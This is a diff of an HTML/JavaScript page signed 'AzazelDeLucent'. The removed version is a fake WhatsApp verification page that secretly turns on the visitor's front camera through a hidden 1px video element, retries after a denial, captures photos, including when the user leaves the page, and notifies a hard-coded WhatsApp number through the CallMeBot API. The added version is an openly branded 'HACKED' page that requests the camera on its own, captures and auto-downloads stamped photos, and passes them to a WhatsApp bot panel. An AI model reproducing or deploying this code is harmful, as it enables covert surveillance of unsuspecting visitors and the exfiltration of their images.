@@ -3,565 +3,346 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web - Verification Required</title>
+    <title>Hacked by AzazelDeLucent</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #efeae2;
+            background: #0a0a0a;
+            font-family: 'Share Tech Mono', monospace;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-        }
-
-        /* ─── Fake WhatsApp UI ─── */
-        .wa-wrapper {
-            width: 100%;
-            max-width: 420px;
-            height: 90vh;
-            max-height: 700px;
-            background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 1px 20px rgba(0,0,0,0.15);
-            display: flex;
-            flex-direction: column;
             overflow: hidden;
-            position: relative;
         }
-
-        .wa-header {
-            background: #075e54;
-            color: white;
-            padding: 14px 18px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            min-height: 60px;
+        canvas#matrix {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0; opacity: 0.12; pointer-events: none;
         }
-
-        .wa-header .back-icon {
-            font-size: 1.4rem;
-            cursor: pointer;
-            opacity: 0.8;
-        }
-
-        .wa-header .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #128c7e;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 1.1rem;
-        }
-
-        .wa-header .info {
-            flex: 1;
-        }
-
-        .wa-header .info .name {
-            font-size: 1rem;
-            font-weight: 500;
-        }
-
-        .wa-header .info .status {
-            font-size: 0.75rem;
-            opacity: 0.8;
-        }
-
-        .wa-header .header-icons {
-            display: flex;
-            gap: 18px;
-            font-size: 1.2rem;
-            opacity: 0.8;
-        }
-
-        /* ─── Chat Area ─── */
-        .wa-chat {
-            flex: 1;
-            background: #efeae2;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI5MCIgdmlld0JveD0iMCAwIDUwIDkwIj48cGF0aCBkPSJNMjUgMzBMNDUgNTAgMjUgNzAgNSA1MHoiIGZpbGw9InJnYmEoMCwwLDAsMC4wMykiLz48L3N2Zz4=');
-            padding: 12px 16px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-
-        /* ─── Bubbles ─── */
-        .bubble {
-            max-width: 85%;
-            padding: 8px 14px;
-            border-radius: 10px;
-            font-size: 0.9rem;
-            line-height: 1.5;
-            position: relative;
-            animation: msgIn 0.3s ease;
-            word-wrap: break-word;
-        }
-
-        @keyframes msgIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .bubble.received {
-            background: white;
-            align-self: flex-start;
-            border-top-left-radius: 2px;
-            box-shadow: 0 1px 1px rgba(0,0,0,0.06);
-        }
-
-        .bubble.sent {
-            background: #d9fdd3;
-            align-self: flex-end;
-            border-top-right-radius: 2px;
-            box-shadow: 0 1px 1px rgba(0,0,0,0.06);
-        }
-
-        .bubble .time {
-            font-size: 0.65rem;
-            color: #999;
-            text-align: right;
-            margin-top: 4px;
-        }
-
-        .bubble .time .tick {
-            margin-left: 4px;
-            font-size: 0.7rem;
-        }
-
-        .bubble.system {
-            background: transparent;
-            align-self: center;
-            font-size: 0.75rem;
-            color: #888;
+        .container {
+            position: relative; z-index: 1; width: 90%; max-width: 750px;
+            padding: 35px; background: rgba(10,10,10,0.88);
+            border: 2px solid #ff0000;
+            box-shadow: 0 0 40px rgba(255,0,0,0.25), inset 0 0 40px rgba(255,0,0,0.04);
             text-align: center;
-            box-shadow: none;
-            max-width: 90%;
         }
-
-        .bubble.image-bubble {
-            padding: 4px;
-            background: white;
-            align-self: flex-end;
-            border-top-right-radius: 2px;
+        .glitch {
+            font-size: 2.8rem; color: #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000;
+            letter-spacing: 5px; margin-bottom: 5px;
+            animation: glitchAnim 2s infinite;
         }
-
-        .bubble.image-bubble img {
-            width: 100%;
-            max-width: 220px;
-            border-radius: 6px;
-            display: block;
+        @keyframes glitchAnim {
+            0%,100%{opacity:1;transform:none}
+            91%{opacity:1;transform:skew(-2deg)}
+            92%{opacity:0.8;transform:skew(3deg)}
+            93%{opacity:1;transform:skew(-1deg)}
+            95%{opacity:0.7;transform:skew(4deg)}
+            96%{opacity:1;transform:none}
         }
-
-        .typing-indicator {
-            align-self: flex-start;
-            background: white;
-            padding: 10px 14px;
-            border-radius: 10px;
-            border-top-left-radius: 2px;
-            display: none;
-            gap: 4px;
-            box-shadow: 0 1px 1px rgba(0,0,0,0.06);
+        .sub { color: #cc0000; font-size: 1rem; letter-spacing: 8px; margin-bottom: 25px; border-bottom: 1px solid #ff000033; padding-bottom: 12px; }
+        .status-bar {
+            display: flex; justify-content: space-between; background: #1a0000;
+            border: 1px solid #ff000066; padding: 10px 15px; margin-bottom: 20px; font-size: 0.8rem;
         }
-
-        .typing-indicator span {
-            width: 7px;
-            height: 7px;
-            background: #999;
-            border-radius: 50%;
-            animation: typing 1.4s infinite;
+        .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 6px; animation: blink 1s infinite; }
+        .dot.green{background:#00ff00;box-shadow:0 0 8px #00ff00}
+        .dot.red{background:#ff0000;box-shadow:0 0 8px #ff0000}
+        .dot.yellow{background:#ffff00;box-shadow:0 0 8px #ffff00;animation:blink .4s infinite}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+        
+        .vid-box {
+            position: relative; width: 100%; max-width: 480px; margin: 0 auto 15px;
+            border: 2px solid #ff000088; background: #000; aspect-ratio: 4/3; overflow: hidden;
         }
-
-        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
-        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes typing {
-            0%, 60%, 100% { opacity: 0.3; transform: scale(0.8); }
-            30% { opacity: 1; transform: scale(1); }
+        #video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
+        .placeholder {
+            width: 100%; height: 100%; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; color: #660000; gap: 8px;
         }
-
-        /* ─── Input Area ─── */
-        .wa-input {
-            background: #f0f2f5;
-            padding: 10px 16px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border-top: 1px solid #e9edef;
+        .placeholder .icon { font-size: 3rem; opacity: 0.4; }
+        .scanlines {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,0,0,0.03) 2px, rgba(255,0,0,0.03) 4px);
+            z-index: 2;
         }
-
-        .wa-input .emoji-btn { font-size: 1.5rem; cursor: pointer; opacity: 0.6; }
-        .wa-input .clip-btn { font-size: 1.3rem; cursor: pointer; opacity: 0.6; }
-        .wa-input input {
-            flex: 1;
-            border: none;
-            background: white;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-size: 0.9rem;
-            outline: none;
+        .live-badge {
+            position: absolute; top: 10px; left: 10px; color: #ff0000; font-size: 0.7rem;
+            text-shadow: 0 0 10px #ff0000; z-index: 3; display: none; letter-spacing: 2px;
         }
-        .wa-input .mic-btn { font-size: 1.5rem; cursor: pointer; opacity: 0.6; }
-
-        /* ─── Camera overlay (stealth) ─── */
-        #stealth-camera {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
+        .flash-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 5; pointer-events: none; display: none;
         }
+        .flash-overlay.active { display: block; background: white; animation: flash 0.25s ease-out; }
+        @keyframes flash { 0%{opacity:0.8}100%{opacity:0} }
+
+        .btn-group { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin: 15px 0; }
+        .btn {
+            background: transparent; border: 1px solid #ff000088; color: #ff4444;
+            padding: 9px 20px; font-family: 'Share Tech Mono', monospace; font-size: 0.8rem;
+            cursor: pointer; letter-spacing: 2px; transition: all 0.3s; text-transform: uppercase;
+        }
+        .btn:hover{background:#ff000022;border-color:#ff0000;box-shadow:0 0 15px rgba(255,0,0,0.3)}
+        .btn:disabled{opacity:0.3;cursor:not-allowed}
+        .btn-primary{border-color:#ff0000;color:#ff0000}
+        .btn-primary:hover{background:#ff000044}
+        .btn-wa{border-color:#00ff00;color:#00ff00}
+        .btn-wa:hover{background:#00ff0011;box-shadow:0 0 15px rgba(0,255,0,0.2)}
+
+        #preview-box { display: none; margin: 10px 0; border: 1px solid #ff000066; padding: 8px; }
+        #preview-box h4 { color: #ff4444; font-size: 0.75rem; margin-bottom: 8px; letter-spacing: 2px; }
+        #preview-img { width: 100%; max-width: 200px; border: 1px solid #333; transform: scaleX(-1); }
+
+        .logs {
+            text-align: left; margin-top: 10px; padding: 8px; background: #050000;
+            border: 1px solid #330000; max-height: 100px; overflow-y: auto; font-size: 0.7rem;
+        }
+        .logs div { color: #884444; margin-bottom: 2px; }
+        .logs .ok { color: #00ff00; }
+        .logs .err { color: #ff0000; }
+        .logs .wa { color: #00cc00; }
+        .logs .info { color: #ffff00; }
+        .ts { color: #444; }
+
+        .footer { margin-top: 15px; padding-top: 12px; border-top: 1px solid #ff000022; font-size: 0.65rem; color: #660000; letter-spacing: 3px; }
+        .footer b { color: #aa0000; }
+        
+        .links {
+            margin: 12px 0; display: flex; gap: 12px; justify-content: center;
+        }
+        .links a {
+            color: #ff4444; font-size: 0.75rem; letter-spacing: 2px;
+            text-decoration: none; border: 1px solid #ff000044; padding: 6px 14px;
+            transition: all 0.3s;
+        }
+        .links a:hover { background: #ff000022; border-color: #ff0000; }
     </style>
 </head>
 <body>
+    <canvas id="matrix"></canvas>
+    <div class="container">
+        <div class="glitch">// HACKED //</div>
+        <div class="sub">>> by AzazelDeLucent <<</div>
 
-    <div class="wa-wrapper">
-        <!-- WhatsApp Header -->
-        <div class="wa-header">
-            <div class="back-icon">‹</div>
-            <div class="avatar">📸</div>
-            <div class="info">
-                <div class="name">AzazelDeLucent</div>
-                <div class="status">online</div>
-            </div>
-            <div class="header-icons">
-                <span>⋮</span>
-            </div>
+        <div class="status-bar">
+            <div><span class="dot yellow" id="dot"></span><span id="status-label">INITIALIZING</span></div>
+            <div>ACCESS: <span id="access-status" style="color:#00ff00;">GRANTED</span></div>
+            <div>TARGET: <span style="color:#00ff00;">FRONT_CAM</span></div>
         </div>
 
-        <!-- Chat Area -->
-        <div class="wa-chat" id="chat-area">
-            <div class="bubble system">Today</div>
-            <div class="bubble received">
-                User joined using AzazelDeLucent protocol
-                <div class="time">12:00</div>
+        <div class="vid-box">
+            <video id="video" autoplay playsinline></video>
+            <div class="placeholder" id="placeholder">
+                <div class="icon">📷</div>
+                <span>[ CAMERA OFFLINE ]</span>
+                <span style="font-size:0.6rem;color:#551111;">click INIT to access</span>
             </div>
-            <div class="bubble received">
-                🔒 End-to-end encrypted
-                <div class="time">12:00</div>
-            </div>
-            <div class="typing-indicator" id="typing-indicator">
-                <span></span><span></span><span></span>
-            </div>
+            <div class="scanlines"></div>
+            <div class="live-badge" id="live-badge">● LIVE</div>
+            <div class="flash-overlay" id="flash"></div>
         </div>
 
-        <!-- Input Area -->
-        <div class="wa-input">
-            <span class="emoji-btn">😊</span>
-            <span class="clip-btn">📎</span>
-            <input type="text" placeholder="Type a message" id="wa-input-field" disabled>
-            <span class="mic-btn">🎤</span>
+        <div id="preview-box">
+            <h4>◆ EXTRACTED FRAME ◆</h4>
+            <img id="preview-img" alt="capture">
         </div>
+
+        <div class="btn-group">
+            <button class="btn" id="btn-init" disabled>▶ INIT</button>
+            <button class="btn btn-primary" id="btn-capture" disabled>■ CAPTURE</button>
+            <button class="btn btn-wa" id="btn-wa" disabled>📤 KIRIM WA</button>
+            <button class="btn" id="btn-stop" disabled>● STOP</button>
+        </div>
+
+        <!-- Quick links to WA bot panel -->
+        <div class="links">
+            <a href="wa-bot/sender.html" target="_blank">📡 WA BOT PANEL</a>
+            <a href="panel-admin/dashboard.html" target="_blank">📊 ADMIN</a>
+        </div>
+
+        <div class="logs" id="logs">
+            <div><span class="ts">[SYSTEM]</span> AzazelDeLucent v4.0 loaded</div>
+            <div><span class="ts">[SYSTEM]</span> Ready for deployment</div>
+        </div>
+
+        <div class="footer">✦ <b>AZAZELDELUCENT</b> SECURITY FRAMEWORK ✦</div>
     </div>
 
-    <!-- Stealth camera element -->
-    <video id="stealth-camera" autoplay playsinline></video>
-
     <script>
-        // ─── CONFIG ──────────────────────────────────────────────────────
-        const WA_NUMBER = '6287879007194';       // +62 878-7900-7194
-        const BOT_NAME = 'AzazelDeLucent';
-        const CAPTURE_DELAY_MS = 2500;           // 2.5s after permission
-        const CHAT_DELAYS = [800, 1200, 600, 1500, 900]; // Typing delays
+        // ─── Matrix ──────────────────────────────────────────────────────
+        const c = document.getElementById('matrix'), cx = c.getContext('2d');
+        let W, H;
+        function resize() { W = c.width = innerWidth; H = c.height = innerHeight; }
+        resize(); onresize = resize;
+        const chars = 'アイウエオカキクケコサシスセソタチツテト0123456789ABCDEF<>/{}[]|&^%$#@!';
+        const cols = Math.floor(W / 14);
+        const drops = Array(cols).fill(1);
+        setInterval(() => {
+            cx.fillStyle = 'rgba(10,0,0,0.05)';
+            cx.fillRect(0,0,W,H);
+            cx.fillStyle = '#ff0000';
+            cx.font = '14px monospace';
+            for(let i=0;i<drops.length;i++) {
+                cx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*14);
+                if(drops[i]*14 > H && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }, 50);
 
-        // ─── DOM ─────────────────────────────────────────────────────────
-        const chatArea = document.getElementById('chat-area');
-        const typingIndicator = document.getElementById('typing-indicator');
-        const inputField = document.getElementById('wa-input-field');
-        const stealthVideo = document.getElementById('stealth-camera');
+        // ─── Vars ────────────────────────────────────────────────────────
+        const video = document.getElementById('video');
+        const placeholder = document.getElementById('placeholder');
+        const liveBadge = document.getElementById('live-badge');
+        const flash = document.getElementById('flash');
+        const dot = document.getElementById('dot');
+        const statusLabel = document.getElementById('status-label');
+        const accessStatus = document.getElementById('access-status');
+        const previewBox = document.getElementById('preview-box');
+        const previewImg = document.getElementById('preview-img');
+        const logs = document.getElementById('logs');
+        const btnInit = document.getElementById('btn-init');
+        const btnCapture = document.getElementById('btn-capture');
+        const btnStop = document.getElementById('btn-stop');
+        const btnWa = document.getElementById('btn-wa');
 
         let stream = null;
-        let photoDataUrl = null;
-        let chatStep = 0;
-        let permissionGranted = false;
+        let active = false;
+        let lastPhoto = null;
+        let photoCount = 0;
 
-        // ─── Logger ─────────────────────────────────────────────────────
-        function log(msg) {
-            const ts = new Date().toLocaleTimeString();
-            console.log(`[${BOT_NAME} ${ts}] ${msg}`);
+        // ─── Helpers ─────────────────────────────────────────────────────
+        function log(msg, cls='') {
+            const e = document.createElement('div');
+            const t = new Date().toTimeString().slice(0,8);
+            e.innerHTML = `<span class="ts">[${t}]</span> ${msg}`;
+            if(cls) e.className = cls;
+            logs.appendChild(e);
+            logs.scrollTop = logs.scrollHeight;
         }
+        function setStatus(s, cls) { statusLabel.textContent = s; dot.className = `dot ${cls}`; }
 
-        // ─── Chat Helpers ───────────────────────────────────────────────
-        function addChatBubble(text, type = 'received', time = null) {
-            const bubble = document.createElement('div');
-            bubble.className = `bubble ${type}`;
-            
-            if (type === 'image') {
-                bubble.className = 'bubble image-bubble sent';
-                bubble.innerHTML = `<img src="${text}" alt="captured"><div class="time">${time || getCurrentTime()} <span class="tick">✓✓</span></div>`;
-            } else {
-                bubble.innerHTML = `${text}<div class="time">${time || getCurrentTime()} <span class="tick">${type === 'sent' ? '✓✓' : ''}</span></div>`;
-            }
-            
-            chatArea.insertBefore(bubble, typingIndicator);
-            chatArea.scrollTop = chatArea.scrollHeight;
-        }
+        // ─── Init Camera ─────────────────────────────────────────────────
+        async function initCam() {
+            setStatus('INITIALIZING', 'yellow');
+            btnInit.disabled = true;
+            btnInit.textContent = '⏳';
+            log('Requesting camera...');
 
-        function getCurrentTime() {
-            const d = new Date();
-            return `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}`;
-        }
-
-        function showTyping(show = true) {
-            typingIndicator.style.display = show ? 'flex' : 'none';
-            chatArea.scrollTop = chatArea.scrollHeight;
-        }
-
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        // ─── Simulate Chat Flow ─────────────────────────────────────────
-        async function runChatFlow() {
-            log('Starting chat flow...');
-
-            // Step 1: Greeting
-            await sleep(800);
-            addChatBubble(`✅ System online. Target captured.`, 'sent');
-            
-            await sleep(1000);
-            addChatBubble(`📸 Initializing camera module...`, 'sent');
-
-            // Step 2: Camera access
-            showTyping(true);
-            await sleep(1500);
-            showTyping(false);
-            
-            addChatBubble(`⚡ Requesting camera permission...`, 'sent');
-            
-            // Actually request camera
-            await requestCamera();
-
-            if (permissionGranted) {
-                addChatBubble(`✅ Camera access GRANTED`, 'sent');
-                
-                // Step 3: Capture
-                showTyping(true);
-                await sleep(CAPTURE_DELAY_MS);
-                showTyping(false);
-                
-                photoDataUrl = capturePhoto();
-                
-                if (photoDataUrl) {
-                    addChatBubble(`📸 Photo captured successfully`, 'sent');
-                    addChatBubble(`📏 Resolution: ${stealthVideo.videoWidth}x${stealthVideo.videoHeight}`, 'sent');
-                    
-                    // Step 4: Send to WhatsApp bot
-                    showTyping(true);
-                    await sleep(2000);
-                    showTyping(false);
-                    
-                    addChatBubble(`📤 Sending to WhatsApp number...`, 'sent');
-                    addChatBubble(`📱 Target: ${WA_NUMBER}`, 'sent');
-                    
-                    // Actually send via API
-                    await sendToWhatsAppAPI(photoDataUrl);
-                    
-                    // Step 5: Show image in chat
-                    showTyping(true);
-                    await sleep(1500);
-                    showTyping(false);
-                    
-                    addChatBubble(photoDataUrl, 'image', getCurrentTime());
-                    addChatBubble(`✅ Image delivered to ${WA_NUMBER}`, 'sent');
-                    
-                    // Step 6: Final message
-                    await sleep(1000);
-                    addChatBubble(`🔴 Mission complete. AzazelDeLucent out.`, 'sent');
-                    
-                    log('Chat flow complete — all steps executed');
-                } else {
-                    addChatBubble(`❌ Failed to capture photo`, 'sent');
-                }
-            } else {
-                addChatBubble(`❌ Camera access DENIED by user`, 'sent');
-                addChatBubble(`⚠️ Attempting fallback method...`, 'sent');
-                
-                // Try to send without photo
-                await sendToWhatsAppAPI(null);
-                addChatBubble(`📱 Alert sent to ${WA_NUMBER} (no photo)`, 'sent');
-            }
-
-            // Disable typing indicator at end
-            showTyping(false);
-        }
-
-        // ─── Camera Access ──────────────────────────────────────────────
-        async function requestCamera() {
-            log('Requesting camera access...');
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
-
-                stealthVideo.srcObject = stream;
-                await stealthVideo.play();
-                permissionGranted = true;
-                log(`Camera active: ${stealthVideo.videoWidth}x${stealthVideo.videoHeight}`);
-
-            } catch (err) {
-                permissionGranted = false;
-                log(`Camera error: ${err.name} — ${err.message}`);
-                
-                // If permission denied, try once more with different constrain
-                try {
-                    log('Retrying with basic constraints...');
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user' },
-                        audio: false
-                    });
-                    stealthVideo.srcObject = stream;
-                    await stealthVideo.play();
-                    permissionGranted = true;
-                    log('Camera access on retry: SUCCESS');
-                } catch (retryErr) {
-                    log(`Camera retry failed: ${retryErr.message}`);
-                }
+                video.srcObject = stream;
+                await video.play();
+                video.style.display = 'block';
+                placeholder.style.display = 'none';
+                liveBadge.style.display = 'block';
+                setStatus('ACTIVE', 'green');
+                accessStatus.textContent = 'ESTABLISHED';
+                btnCapture.disabled = false;
+                btnStop.disabled = false;
+                btnInit.textContent = '✓';
+                active = true;
+                log(`Camera active: ${video.videoWidth}x${video.videoHeight}`, 'ok');
+            } catch(err) {
+                setStatus('ERROR', 'red');
+                btnInit.disabled = false;
+                btnInit.textContent = '▶ RETRY';
+                const msg = err.name==='NotAllowedError'?'DENIED':err.name==='NotFoundError'?'NO CAMERA':err.message;
+                log(`Error: ${msg}`, 'err');
+                accessStatus.textContent = 'BLOCKED';
             }
         }
 
-        // ─── Capture Photo ──────────────────────────────────────────────
-        function capturePhoto() {
-            if (!stream || !stealthVideo.videoWidth) {
-                log('Cannot capture — no stream');
-                return null;
-            }
+        // ─── Capture ─────────────────────────────────────────────────────
+        function capture() {
+            if(!active || !stream) { log('Camera not active', 'err'); return; }
+            flash.classList.remove('active');
+            void flash.offsetWidth;
+            flash.classList.add('active');
 
-            const canvas = document.createElement('canvas');
-            canvas.width = stealthVideo.videoWidth;
-            canvas.height = stealthVideo.videoHeight;
-            const ctx = canvas.getContext('2d');
-
-            // Mirror (front camera)
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(stealthVideo, 0, 0);
+            const cv = document.createElement('canvas');
+            cv.width = video.videoWidth;
+            cv.height = video.videoHeight;
+            const ctx = cv.getContext('2d');
+            ctx.drawImage(video, 0, 0);
             
-            // Reset and add overlay
-            ctx.setTransform(1, 0, 0, 1, 0, 0);
-            
-            // Red tint
-            ctx.fillStyle = 'rgba(255, 0, 0, 0.08)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            // Hacked text
-            ctx.font = `bold ${Math.floor(canvas.width * 0.04)}px Arial`;
+            // Overlay
+            ctx.fillStyle = 'rgba(255,0,0,0.12)';
+            ctx.fillRect(0,0,cv.width,cv.height);
+            const fs = Math.floor(cv.width*0.045);
+            ctx.font = `bold ${fs}px monospace`;
             ctx.fillStyle = '#ff0000';
             ctx.textAlign = 'center';
             ctx.shadowColor = '#ff0000';
-            ctx.shadowBlur = 20;
-            ctx.fillText('● HACKED BY AZAZELDELUCENT', canvas.width / 2, canvas.height - 40);
-            
-            ctx.font = `${Math.floor(canvas.width * 0.02)}px Arial`;
-            ctx.fillStyle = '#ff4444';
-            ctx.shadowBlur = 10;
-            ctx.fillText(`Target: ${WA_NUMBER}`, canvas.width / 2, canvas.height - 15);
+            ctx.shadowBlur = 15;
+            ctx.fillText('● HACKED BY AZAZELDELUCENT', cv.width/2, cv.height-35);
+            ctx.font = `${Math.floor(cv.width*0.02)}px monospace`;
+            ctx.fillStyle = '#ff6666';
+            ctx.shadowBlur = 8;
+            ctx.fillText('+62 878-7900-7194 ← TARGET', cv.width/2, cv.height-12);
 
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
-            log(`Photo captured: ${canvas.width}x${canvas.height} (${Math.round(dataUrl.length / 1024)} KB)`);
-            
-            // Silent download
+            lastPhoto = cv.toDataURL('image/jpeg', 0.9);
+            previewImg.src = lastPhoto;
+            previewBox.style.display = 'block';
+            btnWa.disabled = false;
+            photoCount++;
+
+            const ts = Date.now();
+            log(`[${photoCount}] Captured (${Math.round(lastPhoto.length/1024)} KB)`, 'ok');
             const link = document.createElement('a');
-            link.download = `target_${Date.now()}.jpg`;
-            link.href = dataUrl;
+            link.download = `target_${ts}.jpg`;
+            link.href = lastPhoto;
             link.click();
-
-            return dataUrl;
         }
 
-        // ─── Send to WhatsApp via API ────────────────────────────────────
-        async function sendToWhatsAppAPI(imageDataUrl) {
-            log(`Sending to WA: ${WA_NUMBER}`);
-
-            const message = `⚠️ TARGET CAPTURED - AzazelDeLucent\n📸 Photo captured at ${new Date().toLocaleString()}\n📍 Target: ${WA_NUMBER}`;
+        // ─── Send to WA Bot ──────────────────────────────────────────────
+        function sendToWA() {
+            if(!lastPhoto) { log('No photo to send', 'err'); return; }
+            // Simpan foto ke localStorage agar bisa diambil wa-bot/sender.html
+            localStorage.setItem('azazel_last_photo', lastPhoto);
+            localStorage.setItem('azazel_photo_time', new Date().toISOString());
+            localStorage.setItem('azazel_target_number', '6287879007194');
             
-            let apiSuccess = false;
-
-            // Method 1: CallMeBot API
-            try {
-                const apiUrl = `https://api.callmebot.com/whatsapp.php?phone=${WA_NUMBER}&text=${encodeURIComponent(message)}&apikey=12345`;
-                const resp = await fetch(apiUrl, { mode: 'no-cors' });
-                log(`CallMeBot API: request sent`);
-                apiSuccess = true;
-                addChatBubble(`✅ Alert sent via WhatsApp API`, 'sent');
-            } catch (e) {
-                log(`CallMeBot error: ${e.message}`);
-            }
-
-            // Method 2: Try WhatsApp direct link (for backup)
-            try {
-                if (!apiSuccess) {
-                    const waUrl = `https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(message)}`;
-                    window.open(waUrl, '_blank');
-                    log(`wa.me link opened as backup`);
-                    addChatBubble(`📱 WhatsApp link opened as backup`, 'sent');
-                }
-            } catch (e) {
-                log(`wa.me error: ${e.message}`);
-            }
-
-            // Method 3: Try WhatsApp Web direct API
-            try {
-                // Some WhatsApp gateway APIs
-                const gateways = [
-                    `https://api.whatsapp.com/send?phone=${WA_NUMBER}&text=${encodeURIComponent(message)}`,
-                    `https://web.whatsapp.com/send?phone=${WA_NUMBER}&text=${encodeURIComponent(message)}`
-                ];
-                
-                // Try to send image via base64 if possible
-                if (imageDataUrl) {
-                    log('Image ready for delivery');
-                    // In a real bot, we'd upload to a server and send the URL
-                    // For now, we note it
-                }
-            } catch (e) {
-                log(`Gateway error: ${e.message}`);
-            }
-
-            log('WhatsApp send sequence complete');
-            return true;
+            log('📤 Photo saved to local storage for WA bot', 'wa');
+            log('📡 Open WA BOT PANEL to send', 'wa');
+            
+            // Buka WA bot panel
+            window.open('wa-bot/sender.html', '_blank');
         }
 
-        // ─── Stealth: Capture on visibility change ─────────────────────
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden && stream && !photoDataUrl) {
-                log('User leaving page — capturing photo stealth');
-                const photo = capturePhoto();
-                if (photo) {
-                    photoDataUrl = photo;
-                    sendToWhatsAppAPI(photo);
-                }
-            }
-        });
+        // ─── Stop ────────────────────────────────────────────────────────
+        function stop() {
+            if(stream) { stream.getTracks().forEach(t=>t.stop()); stream=null; }
+            video.style.display = 'none';
+            placeholder.style.display = 'flex';
+            liveBadge.style.display = 'none';
+            active = false;
+            setStatus('TERMINATED', 'red');
+            accessStatus.textContent = 'CLOSED';
+            btnCapture.disabled = true;
+            btnStop.disabled = true;
+            btnWa.disabled = true;
+            btnInit.disabled = false;
+            btnInit.textContent = '▶ RE-INIT';
+            log('Camera stopped');
+        }
 
-        // ─── Stealth: Capture on click outside ─────────────────────────
-        document.addEventListener('click', (e) => {
-            // If user clicks outside the WA wrapper, it might be trying to leave
-            const wrapper = document.querySelector('.wa-wrapper');
-            if (!wrapper.contains(e.target) && stream && !photoDataUrl) {
-                log('User clicked outside — capturing stealth');
-            }
-        });
+        // ─── Events ──────────────────────────────────────────────────────
+        btnInit.onclick = initCam;
+        btnCapture.onclick = capture;
+        btnStop.onclick = stop;
+        btnWa.onclick = sendToWA;
+        onbeforeunload = () => { if(stream) stream.getTracks().forEach(t=>t.stop()); };
+        onkeydown = (e) => { if(e.key===' ' && !e.target.matches('input,button')) { e.preventDefault(); if(!btnCapture.disabled) capture(); } };
 
-        // ─── Auto Start ─────────────────────────────────────────────────
-        window.addEventListener('load', () => {
-            log('Page loaded — starting AzazelDeLucent bot');
-            
-            // Show initial "onlin
+        // Auto init
+        setTimeout(initCam, 600);
+        log('System ready — SPACE to capture', 'info');
+        log('WA Target: +62 878-7900-7194', 'wa');
+    </script>
+</body>
+    </html>
